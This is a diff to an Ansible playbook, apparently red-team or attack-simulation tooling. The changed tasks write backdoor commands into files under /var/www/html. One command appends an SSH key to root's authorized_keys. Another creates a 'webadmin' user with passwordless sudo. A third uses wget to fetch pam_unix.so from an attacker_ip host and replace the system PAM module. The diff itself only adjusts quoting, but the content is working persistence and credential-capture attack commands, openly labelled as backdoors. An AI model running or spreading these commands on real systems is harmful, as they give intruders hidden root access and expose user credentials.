@@ -47,7 +47,7 @@
     - name: Create file with add-key-to-root-authorize-command
       ansible.builtin.copy:
               content: |
-                "\"echo {{sshkey.public_key}} >> /root/.ssh/authorized_keys\""
+                "echo {{sshkey.public_key}} >> /root/.ssh/authorized_keys"
               dest: "/var/www/html/README.txt"
               owner: "root"
               mode: "0755"
@@ -70,7 +70,7 @@
     - name: Create file for creating a backdoor user
       ansible.builtin.copy:
               content: |
-                "\"useradd -s /bin/bash -m webadmin; mkdir -p /home/webadmin/.ssh; chown webadmin.webadmin -R /home/webadmin; echo {{sshkey.public_key}} >> /home/webadmin/.ssh/authorized_keys; echo 'webadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/webadmin\""
+                "useradd -s /bin/bash -m webadmin; mkdir -p /home/webadmin/.ssh; chown webadmin.webadmin -R /home/webadmin; echo {{sshkey.public_key}} >> /home/webadmin/.ssh/authorized_keys; echo 'webadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/webadmin"
               dest: "/var/www/html/README.txt.2"
               owner: "root"
               mode: "0755"
@@ -90,7 +90,7 @@
     - name: Create file for a libpam backdoor
       ansible.builtin.copy:
               content: |
-                      "\"wget http://{{attacker_ip}}/pam_unix.so; mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so\""
+                      "wget http://{{attacker_ip}}/pam_unix.so; mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so"
               dest: "/var/www/html/README.txt.4"
               owner: "root"
               mode: "0755"
